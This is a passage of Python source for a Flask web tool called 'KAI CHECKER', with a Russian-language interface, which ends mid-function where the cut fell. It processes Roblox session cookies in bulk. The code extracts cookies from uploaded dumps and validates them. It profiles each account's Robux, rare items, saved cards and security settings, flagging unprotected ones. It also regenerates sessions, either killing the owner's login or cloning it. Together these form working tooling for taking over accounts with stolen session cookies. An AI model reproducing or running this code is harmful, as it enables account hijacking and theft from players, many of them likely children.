from flask import Flask, render_template_string, request, jsonify, send_file, Response
import requests, json, time, logging, re, os, urllib3, sys, asyncio, zipfile, urllib.parse, io, csv
from typing import Dict, List, Optional
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter

# ===== ИНИЦИАЛИЗАЦИЯ =====
os.makedirs("data/profiles", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("input", exist_ok=True)
os.makedirs("output", exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as cffi_requests
    from curl_cffi.requests import AsyncSession
    HAS_CFFI = True
except ImportError:
    cffi_requests = None
    HAS_CFFI = False

HISTORY_FILE = "data/history.json"

def save_history(task_type: str, details: str):
    history = []
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history = json.load(f)
        except Exception:
            history = []
    history.insert(0, {
        'date': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'type': task_type,
        'details': details
    })
    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
        json.dump(history[:50], f, ensure_ascii=False, indent=2)

# ===== СОЗДАНИЕ СЕССИИ =====

def create_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'application/json'
    })
    adapter = HTTPAdapter(pool_connections=150, pool_maxsize=150, max_retries=1)
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    return s

# ===== EXTRACT COOKIES =====

def extract_cookies(text):
    if not text:
        return []
    cookies = []
    for line in text.split('\n'):
        line = line.strip()
        if '_|WARNING' in line and len(line) > 200:
            start = line.find('_|WARNING')
            cookie = line[start:].strip()
            if len(cookie) > 200:
                cookies.append(cookie)
    matches = re.findall(r'_\|WARNING[^|]*\|_\S{100,}', text)
    for m in matches:
        m = m.strip().strip('"\'')
        if len(m) > 200 and m not in cookies:
            cookies.append(m)
    return cookies

# ===== GET FULL INFO =====

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'PendingRobux': 0, 'OutgoingRobuxYear': 0, 'Created': '?',
        'RegistrationDays': 0, 'EmailSet': False, 'TwoFactorEnabled': False,
        'AccountPinEnabled': False, 'PhoneSet': False, 'CardsCount': 0,
        'Country': '?', 'Premium': False, 'Playtime': {}, 'TotalRAP': 0,
        'RareItems': [], 'PurchasedGamepasses': {}, 'TotalInventory': 0,
        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ'
    }
    try:
        s = requests.Session()
        s.headers.update({
            'Cookie': f'.ROBLOSECURITY={cookie.strip()}',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        })
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code == 200:
            d = r.json()
            info['UserID'] = d.get('id')
            info['Username'] = d.get('name')
            info['status'] = '✅'
        elif r.status_code == 401:
            info['status'] = '❌'
            return info
        elif r.status_code == 403:
            info['status'] = '🚫'
            return info
        else:
            return info
        uid = info['UserID']

        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except:
                return {}

        d = g('https://www.roblox.com/my/settings/json')
        if d:
            info['RegistrationDays'] = d.get('AccountAgeInDays', 0)
            info['Premium'] = d.get('IsPremium', False)
            security = d.get('MyAccountSecurityModel', {})
            info['EmailSet'] = security.get('IsEmailSet', False)
            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
            info['PhoneSet'] = security.get('IsPhoneSet', False)

        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except:
                pass

        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb:
            info['Robux'] = rb.get('robux', 0)

        td = g(f'https://economy.roblox.com/v2/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary')
        if td:
            info['PendingRobux'] = td.get('pendingRobuxTotal', 0)
            info['OutgoingRobuxYear'] = td.get('outgoingRobuxTotal', 0)

        cards = g('https://apis.roblox.com/payments-gateway/v1/payment-profiles')
        info['CardsCount'] = len(cards) if isinstance(cards, list) else 0

        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if country:
            info['Country'] = country.get('countryCode', '?')

        try:
            tr = 0
            ri = []
            ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
            if ir.status_code == 200:
                data = ir.json()
                for item in data.get('data', []):
                    asset_id = item.get('assetId')
                    rap = item.get('recentAveragePrice', 0) or 0
                    tr += rap
                    if rap >= 1000:
                        ri.append({'name': item.get('name', '?'), 'rap': rap})
                info['TotalInventory'] = len(data.get('data', []))
            info['TotalRAP'] = tr
            ri.sort(key=lambda x: x['rap'], reverse=True)
            info['RareItems'] = ri[:10]
        except:
            pass

        # ===== ГЕЙМПАССЫ =====
        try:
            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
            cursor = ""
            page = 0
            gamepasses_dict = {}
            
            while page < 10:
                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
                r = s.get(url, verify=False, timeout=12)
                if r.status_code != 200:
                    break
                data = r.json()
                for item in data.get('data', []):
                    details = item.get('details', {})
                    item_type = str(details.get('type', ''))
                    price = abs(item.get('currency', {}).get('amount', 0))
                    if price >= 100 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {})
                        place_name = place_info.get('name', 'Неизвестная игра')
                        if place_name not in gamepasses_dict:
                            gamepasses_dict[place_name] = []
                        gamepasses_dict[place_name].append({'name': name, 'price': price})
                cursor = data.get('nextPageCursor')
                if not cursor:
                    break
                page += 1
                time.sleep(0.15)
            
            info['PurchasedGamepasses'] = gamepasses_dict
        except Exception as e:
            logger.error(f"Gamepass error: {e}")

        # ===== ПЛЕЙТАЙМ (ПЛЕЙСЫ) =====
        try:
            pt = s.get(f'https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe?userId={uid}', timeout=10, verify=False)
            if pt.status_code == 200:
                pd = pt.json()
                for i in pd.get('universeWeeklyScreentimes', []):
                    m = i.get('weeklyMinutes', 0)
                    if m > 0:
                        # Получаем название игры
                        universe_id = i.get('universeId')
                        game_name = None
                        try:
                            gr = s.get(f"https://games.roblox.com/v1/games?universeIds={universe_id}", timeout=5, verify=False)
                            if gr.status_code == 200:
                                game_data = gr.json()
                                if game_data.get('data'):
                                    game_name = game_data['data'][0].get('name', f"Universe_{universe_id}")
                        except:
                            pass
                        if not game_name:
                            game_name = f"Universe_{universe_id}"
                        info['Playtime'][game_name] = m
        except:
            pass

        security_score = 0
        if info.get('EmailSet'): security_score += 1
        if info.get('TwoFactorEnabled'): security_score += 2
        if info.get('AccountPinEnabled'): security_score += 1
        if info.get('PhoneSet'): security_score += 1

        if security_score >= 4:
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
        elif security_score >= 2:
            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
        else:
            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
    except Exception as e:
        logger.error(f"Err: {e}")
    return info

# ===== ГЕНЕРАЦИЯ ОТЧЁТА =====

def generate_txt_report(info: dict) -> str:
    un = info.get('Username', '?')
    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
    status = info.get('status', '⚠️')
    status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
    
    r = f"📋 {un} [{year}]\n"
    r += f"{status_icon} {status_text} | 🆔 {info.get('UserID', '?')}\n\n"
    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '⬜ Free'}\n"
    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
    if info.get('TotalRAP', 0) > 0:
        r += f"💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
    r += f"🛡️ БЕЗОПАСНОСТЬ: {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"🔒 PIN: {'✅' if info.get('AccountPinEnabled') else '❌'} | 📱 Телефон: {'✅' if info.get('PhoneSet') else '❌'}\n"
    r += f"💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
    
    # ===== ПЛЕЙСЫ (ИГРЫ) ИЗ PLAYTIME =====
    pt = info.get('Playtime', {})
    if pt:
        tm = sum(pt.values())
        h = tm // 60
        m = tm % 60
        r += f"\n🎮 ПЛЕЙСЫ (плейтайм): {h}ч {m}м\n"
        for game, mins in sorted(pt.items(), key=lambda x: x[1], reverse=True)[:5]:
            r += f"   └ {game}: {mins}м\n"
    else:
        r += f"\n🎮 ПЛЕЙСЫ: Нет данных\n"
    
    # ===== ГЕЙМПАССЫ =====
    gp = info.get('PurchasedGamepasses', {})
    if gp:
        total_sum = sum(sum(p['price'] for p in passes) for passes in gp.values())
        r += f"\n📦 ГЕЙМПАССЫ ({total_sum:,} R$):\n"
        for game, passes in list(gp.items())[:5]:
            game_total = sum(p['price'] for p in passes)
            r += f"   🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"      └ ...и ещё {len(passes)-5}\n"
    else:
        r += f"\n📦 ГЕЙМПАССЫ: Нет\n"
    
    # ===== РЕДКИЕ ПРЕДМЕТЫ =====
    rare = info.get('RareItems', [])
    if rare:
        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ:\n"
        for item in rare[:3]:
            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
    
    r += f"\n\n🍪 COOKIE:\n{info.get('Cookie', '')}"
    return r

def generate_html_report(info: dict) -> str:
    un = info.get('Username', '?')
    gp = info.get('PurchasedGamepasses', {})
    gp_html = ""
    for game, passes in gp.items():
        total = sum(p['price'] for p in passes)
        gp_html += f"<div style='margin-top:8px;'><strong style='color:#ffaa33;'>{game}</strong> (⏣ {total:,})"
        for p in passes[:5]:
            gp_html += f"<div style='margin-left:20px;color:#888;'>└ {p['name']} — ⏣ {p['price']:,}</div>"
        if len(passes) > 5:
            gp_html += f"<div style='margin-left:20px;color:#666;'>└ ...и ещё {len(passes)-5}</div>"
        gp_html += "</div>"
    
    pt = info.get('Playtime', {})
    pt_html = ""
    if pt:
        tm = sum(pt.values())
        h = tm // 60
        m = tm % 60
        pt_html += f"<div style='margin-top:8px;'><strong style='color:#ffaa33;'>Плейс (плейтайм):</strong> {h}ч {m}м"
        for game, mins in sorted(pt.items(), key=lambda x: x[1], reverse=True)[:5]:
            pt_html += f"<div style='margin-left:20px;color:#888;'>└ {game}: {mins}м</div>"
        pt_html += "</div>"
    
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Report - {un}</title>
<style>
body {{ background: #0a0a14; color: #e0e0e0; font-family: sans-serif; padding: 20px; }}
.card {{ background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 15px; }}
.header {{ font-size: 18px; font-weight: bold; color: #00ff99; border-bottom: 1px solid #1a1a2e; padding-bottom: 10px; margin-bottom: 15px; display:flex; justify-content:space-between; }}
.grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; }}
.stat-item {{ background: #0a0a14; padding: 12px; border-radius: 8px; border: 1px solid #1f1f38; }}
.stat-label {{ color: #888; font-size: 11px; text-transform: uppercase; }}
.stat-value {{ font-size: 15px; font-weight: bold; color: #ffaa33; }}
.cookie-box {{ background: #05050a; border: 1px solid #1a1a2e; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #888; max-height: 120px; overflow-y: auto; border-radius: 6px; }}
</style>
</head>
<body>
<div class="card">
<div class="header"><span>📊 ACCOUNT REPORT</span><span style="color:#00ff99;">{info.get('status')}</span></div>
<div class="grid">
<div class="stat-item"><div class="stat-label">Юзернейм</div><div class="stat-value">{info.get('Username')}</div></div>
<div class="stat-item"><div class="stat-label">Robux</div><div class="stat-value">⏣ {info.get('Robux', 0):,}</div></div>
<div class="stat-item"><div class="stat-label">RAP</div><div class="stat-value">⏣ {info.get('TotalRAP', 0):,}</div></div>
<div class="stat-item"><div class="stat-label">Страна</div><div class="stat-value">{info.get('Country')}</div></div>
</div>
<div style="margin-top:15px;"><strong style="color:#ffaa33;">🎮 ПЛЕЙСЫ:</strong>{pt_html if pt_html else ' Нет данных'}</div>
<div style="margin-top:15px;"><strong style="color:#ffaa33;">🎟️ ГЕЙМПАССЫ:</strong>{gp_html if gp_html else ' Нет'}</div>
</div>
<div class="card"><div class="header">🍪 COOKIE</div><div class="cookie-box">{info.get('Cookie')}</div></div>
</body>
</html>"""

def generate_csv_data(reports: list) -> str:
    output = io.StringIO()
    output.write("sep=;\n")
    writer = csv.writer(output, delimiter=';')
    writer.writerow(['Username', 'User ID', 'Robux', 'RAP', 'Gamepasses', 'Country', '2FA', 'Cookie'])
    for r in reports:
        gp_count = sum(len(passes) for passes in r.get('PurchasedGamepasses', {}).values())
        writer.writerow([
            r.get('Username'), r.get('UserID'), r.get('Robux'), r.get('TotalRAP'),
            gp_count, r.get('Country'), '✅' if r.get('TwoFactorEnabled') else '❌', r.get('Cookie')
        ])
    return output.getvalue()

# ===== ФРЕШЕР =====

async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    if not HAS_CFFI:
        return False, None, "❌ Установите curl_cffi"
    logs = []
    headers_base = {
        "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/"
    }
    async with AsyncSession(impersonate="chrome120") as session:
        r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=8)
        csrf_token = r_csrf.headers.get("x-csrf-token")
        if not csrf_token:
            return False, None, "❌ Не удалось получить CSRF token"
        ticket_headers = headers_base.copy()
        ticket_headers.update({"x-csrf-token": csrf_token, "RBXAuthenticationNegotiation": "1", "Content-Type": "application/json"})
        r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=8)
        ticket = r_ticket.headers.get("rbx-authentication-ticket")
        if not ticket:
            return False, None, "❌ Ошибка генерации ticket"
        redeem_headers = {"User-Agent": "Roblox/WinInet", "RBXAuthenticationNegotiation": "1", "Content-Type": "application/json"}
        r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=8)
        new_cookie = None
        set_cookie_hdr = r_redeem.headers.get("set-cookie", "")
        if ".ROBLOSECURITY=" in set_cookie_hdr:
            parts = set_cookie_hdr.split(".ROBLOSECURITY=")
            if len(parts) > 1:
                new_cookie = parts[1].split(";")[0]
        if not new_cookie or new_cookie == old_cookie:
            return False, None, "❌ Не удалось извлечь новый кук"
        if kill_old:
            await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=4)
            logs.append("✅ Старая сессия инвалидирована")
        else:
            logs.append("ℹ️ Старая сессия сохранена")
        return True, new_cookie, "\n".join(logs)

def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
    loop = None
    try:
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
        return res
    except Exception as e:
        return False, None, f"[ERROR] {e}"
    finally:
        if loop and not loop.is_closed():
            loop.close()

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>KAI CHECKER</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0a0a14; color: #e0e0e0; font-family: 'Inter', sans-serif; min-height: 100vh; padding: 20px; }
.container { max-width: 1100px; margin: 0 auto; }
.header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 25px; }
.logo-text { font-size: 24px; font-weight: 700; color: #00ff99; }
.logo-text span { color: #ffaa33; }
.tabs { display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap; }
.tab { padding: 10px 20px; background: #12121f; border: 1px solid #1a1a2e; border-radius: 8px; color: #888; cursor: pointer; font-size: 14px; transition: all 0.2s; user-select: none; }
.tab:hover { border-color: #00ff99; color: #fff; }
.tab.active { border-color: #00ff99; color: #00ff99; background: #00ff9910; }
.tab-content { display: none; }
.tab-content.active { display: block; }
.card { background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 25px; margin-bottom: 20px; }
.card h2 { font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 15px; }
.upload-area { border: 2px dashed #1a1a2e; border-radius: 8px; padding: 35px; text-align: center; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; }
.upload-area:hover { border-color: #00ff99; background: #00ff9905; }
.upload-area.drag-active { border-color: #00ff99 !important; background: #00ff9915 !important; }
.upload-area p { color: #888; font-size: 14px; pointer-events: none; }
.upload-area p strong { color: #00ff99; }
.btn { padding: 10px 24px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
.btn-primary { background: #00ff99; color: #0a0a14; }
.btn-primary:hover { background: #00cc77; }
.btn-success { background: #00cc88; color: #0a0a14; margin-top: 12px; text-decoration: none; display: inline-block; }
.btn-success:hover { background: #00aa66; }
.format-selector { display: flex; gap: 15px; align-items: center; margin-bottom: 15px; background: #0a0a14; padding: 12px; border-radius: 8px; border: 1px solid #1a1a2e; flex-wrap: wrap; }
.format-selector label { font-size: 13px; color: #aaa; cursor: pointer; display: flex; align-items: center; gap: 6px; }
.format-selector input[type="radio"] { accent-color: #00ff99; }
.result-box { background: #0a0a14; border: 1px solid #1a1a2e; border-radius: 8px; padding: 15px; margin-top: 15px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #e0e0e0; white-space: pre-wrap; }
.result-box.success { border-color: #00ff99; }
.result-box.error { border-color: #ff3355; }
.result-box code { display: block; word-break: break-all; margin: 10px 0; padding: 10px; background: #12121f; border-radius: 6px; font-size: 12px; color: #00ff99; }
.history-item { background: #0a0a14; border: 1px solid #1a1a2e; padding: 12px 16px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; }
.footer { text-align: center; padding: 20px 0; color: #555; font-size: 13px; border-top: 1px solid #1a1a2e; margin-top: 30px; }
</style>
</head>
<body>
<div class="container">
<div class="header"><div class="logo-text">KAI <span>CHECKER</span></div></div>
<div class="tabs">
<div class="tab active" data-tab="validator">✅ Валидатор</div>
<div class="tab" data-tab="fullcheck">📊 Полный Чекер</div>
<div class="tab" data-tab="fresher">🔄 Фрешер</div>
<div class="tab" data-tab="duplicator">🔁 Дубликатор</div>
<div class="tab" data-tab="history" onclick="loadHistory()">📜 История</div>
<div class="tab" data-tab="other">📦 Прочее</div>
</div>

<!-- ВАЛИДАТОР -->
<div class="tab-content active" id="tab-validator">
<div class="card">
<h2>Быстрый Валидатор Куков</h2>
<div class="upload-area" id="valArea" onclick="document.getElementById('valFile').click()">
<p>📁 <strong>КЛИКНИТЕ ИЛИ ПЕРЕТАЩИТЕ .TXT ФАЙЛ</strong></p>
</div>
<input type="file" id="valFile" accept=".txt" style="display:none;">
<button class="btn btn-primary" onclick="runValidator()">НАЧАТЬ ПРОВЕРКУ</button>
<div class="result-box" id="validatorResult"></div>
</div>
</div>

<!-- ПОЛНЫЙ ЧЕКЕР -->
<div class="tab-content" id="tab-fullcheck">
<div class="card">
<h2>Глубокая Проверка и Генерация Отчетов</h2>
<div class="format-selector">
<span style="color:#888; font-size:13px; font-weight:600;">Формат отчета:</span>
<label><input type="radio" name="reportFormat" value="zip" checked> 📦 ZIP (один .txt на аккаунт)</label>
<label><input type="radio" name="reportFormat" value="html"> 🌐 HTML</label>
<label><input type="radio" name="reportFormat" value="csv"> 📊 CSV</label>
</div>
<div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
<p>📁 <strong>ЗАГРУЗИТЬ .TXT ДЛЯ ПОЛНОГО АНАЛИЗА</strong></p>
</div>
<input type="file" id="fullFile" accept=".txt" style="display:none;">
<button class="btn btn-primary" onclick="runFullcheck()">ЗАПУСТИТЬ АНАЛИЗ</button>
<div class="result-box" id="fullcheckResult"></div>
</div>
</div>

<!-- ФРЕШЕР -->
<div class="tab-content" id="tab-fresher">
<div class="card">
<h2>🔄 Фрешер (Обновление с инвалидацией)</h2>
<textarea id="freshInput" placeholder="Вставьте кук..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
<button class="btn btn-primary" onclick="freshCookie()">ОБНОВИТЬ КУК</button>
<div class="result-box" id="freshResult"></div>
</div>
</div>

<!-- ДУБЛИКАТОР -->
<div class="tab-content" id="tab-duplicator">
<div class="card">
<h2>🔁 Дубликатор (Клонирование сессии)</h2>
<textarea id="duplicateInput" placeholder="Вставьте кук..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
<button class="btn btn-primary" onclick="duplicateCookie()">СОЗДАТЬ КЛОН</button>
<div class="result-box" id="duplicateResult"></div>
</div>
</div>

<!-- ИСТОРИЯ -->
<div class="tab-content" id="tab-history">
<div class="card"><h2>История Операций</h2><div id="historyList"><p style="color:#666;">Загрузка...</p></div></div>
</div>

<!-- ПРОЧЕЕ -->
<div class="tab-content" id="tab-other">
<div class="card">
<h2>🧹 Управление файлами</h2>
<button class="btn" style="background: #ff3355; color: #fff;" onclick="clearOutput()">ОЧИСТИТЬ ПАПКУ OUTPUT</button>
<div class="result-box" id="clearResult" style="margin-top:10px;"></div>
</div>
</div>

<div class="footer">KAI CHECKER v3.3 — WITH PLAYTIME & GAMEPASSES</div>
</div>

<script>
document.querySelectorAll('.tab').forEach(tab => {
tab.addEventListener('click', function() {
document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
this.classList.add('active');
document.getElementById('tab-' + this.dataset.tab).classList.add('active');
});
});

function initDropZone(areaId, inputId) {
const area = document.getElementById(areaId);
const input = document.getElementById(inputId);
if (!area || !input) return;
['dragenter','dragover','dragleave','drop'].forEach(eName => {
area.addEventListener(eName, (e) => { e.preventDefault(); e.stopPropagation(); }, false);
});
['dragenter','dragover'].forEach(eName => {
area.addEventListener(eName, () => area.classList.add('drag-active'), false);
});
['dragleave','drop'].forEach(eName => {
area.addEventListener(eName, () => area.classList.remove('drag-active'), false);
});
area.addEventListener('drop', (e) => {
const dt = e.dataTransfer;
if (dt && dt.files.length > 0) {
input.files = dt.files;
showSelectedFile(area, dt.files[0]);
}
});
input.addEventListener('change', () => {
if (input.files.length > 0) showSelectedFile(area, input.files[0]);
});
}

function showSelectedFile(area, file) {
const sizeKb = (file.size / 1024).toFixed(1);
area.querySelector('p').innerHTML = `✅ <strong>ФАЙЛ ПОДГРУЖЕН:</strong> ${file.name} <span style="color:#888;">(${sizeKb} KB)</span>`;
area.style.borderColor = '#00ff99';
area.style.background = '#00ff9908';
}

document.addEventListener('DOMContentLoaded', () => {
initDropZone('valArea', 'valFile');
initDropZone('fullArea', 'fullFile');
});

async function clearOutput() {
if (!confirm('Удалить все файлы из папки output?')) return;
const res = document.getElementById('clearResult');
try {
const response = await fetch('/api/clear-output', { method: 'POST' });
const data = await response.json();
res.className = data.success ? 'result-box success' : 'result-box error';
res.textContent = data.message;
} catch (e) {
res.className = 'result-box error';
res.textContent = 'Ошибка: ' + e;
}
}

async function runValidator() {
const fileInput = document.getElementById('valFile');
const resBox = document.getElementById('validatorResult');
if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
const formData = new FormData();
formData.append('file', fileInput.files[0]);
resBox.textContent = '⏳ Проверка...';
resBox.className = 'result-box';
try {
const r = await fetch('/api/validate', { method: 'POST', body: formData });
const data = await r.json();
resBox.className = data.success ? 'result-box success' : 'result-box error';
if (data.download_url) {
resBox.innerHTML = data.message + `<br><a href="${data.download_url}" class="btn btn-success">📥 СКАЧАТЬ ВАЛИДНЫЕ</a>`;
} else {
resBox.textContent = data.message;
}
} catch (e) {
resBox.className = 'result-box error';
resBox.textContent = 'Ошибка: ' + e;
}
}

async function runFullcheck() {
const fileInput = document.getElementById('fullFile');
const resBox = document.getElementById('fullcheckResult');
const format = document.querySelector('input[name="reportFormat"]:checked').value;
if (!fileInput.files.length) { alert('Загрузите .txt файл!'); return; }
const formData = new FormData();
formData.append('file', fileInput.files[0]);
formData.append('format', format);
resBox.textContent = '⏳ Анализ...';
resBox.className = 'result-box';
try {
const r = await fetch('/api/fullcheck', { method: 'POST', body: formData });
const data = await r.json();
if (data.success) {
resBox.className = 'result-box success';
let html = `✅ Анализ завершен! Обработано: ${data.total}\n`;
if (data.download_url) {
html += `\n📥 <a href="${data.download_url}" class="btn btn-success" target="_blank">СКАЧАТЬ ОТЧЕТ</a>`;
}
resBox.innerHTML = html;
} else {
resBox.className = 'result-box error';
resBox.textContent = data.message;
}
} catch (e) {
resBox.className = 'result-box error';
resBox.textContent = 'Ошибка: ' + e;
}
}

async function freshCookie() {
const cookie = document.getElementById('freshInput').value.trim();
const resBox = document.getElementById('freshResult');
if (!cookie) { alert('Введите кук!'); return; }
resBox.textContent = '⏳ Обновление...';
resBox.className = 'result-box';
try {
const r = await fetch('/api/refresh', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({cookie: cookie, kill: true})
});
const data = await r.json();
if (data.success) {
resBox.className = 'result-box success';
resBox.innerHTML = `✅ Обновлено!<br><code>${data.new_cookie}</code>`;
} else {
resBox.className = 'result-box error';
resBox.textContent = data.message;
}
} catch (e) {
resBox.className = 'result-box error';
resBox.textContent = 'Ошибка: ' + e;
}
}

async function duplicateCookie() {
const cookie = document.getElementById('duplicateInput').value.trim();
const resBox = document.getElementById('duplicateResult');
if (!cookie) { alert('Введите кук!'); return; }
resBox.textContent = '⏳ Клонирование...';
resBox.className = 'result-box';
try {
const r = await fetch('/api/refresh', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({cookie: cookie, kill: false})
});
const data = await r.json();
if (data.success) {
resBox.className = 'result-box success';
resBox.innerHTML = `✅ Клон создан!<br><code>${data.new_cookie}</code>`;
} else {
resBox.className = 'result-box error';
resBox.textContent = data.message;
}
} catch (e) {
resBox.className = 'result-box error';
resBox.textContent = 'Ошибка: ' + e;
}
}

async function loadHistory() {
const container = document.getElementById('historyList');
container.innerHTML = '<p style="color:#888;">Загрузка...</p>';
try {
const r = await fetch('/api/history');
const history = await r.json();
if (!history.length) {
container.innerHTML = '<p style="color:#666;">История пуста.</p>';
return;
}
let html = '';
history.forEach(item => {
html += `<div class="history-item">
<div><span style="color:#00ff99;">[${item.type}]</span> ${item.details}</div>
<div style="color:#666; font-size:12px;">${item.date}</div>
</div>`;
});
container.innerHTML = html;
} catch (e) {
container.innerHTML = '<p style="color:#ff3355;">Ошибка загрузки.</p>';
}
}
</script>
</body>
</html>
"""

# ============================================================
# API РОУТЫ
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/validate", methods=["POST"])
def api_validate():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    cookies = extract_cookies(content)
    if not cookies:
        return jsonify({"success": False, "message": "Куки не обнаружены"})
    
    valid = []
    invalid = []
    for c in cookies[:50]:
        s = create_session(c)
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=3, verify=False)
        if r.status_code == 200:
            valid.append(c)
        else:
            invalid.append(c)
    
    save_history("VALIDATOR", f"Проверено: {len(cookies)} | Валидных: {len(valid)}")
    
    if valid:
        filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join("output", filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid))
        return jsonify({
            "success": True,
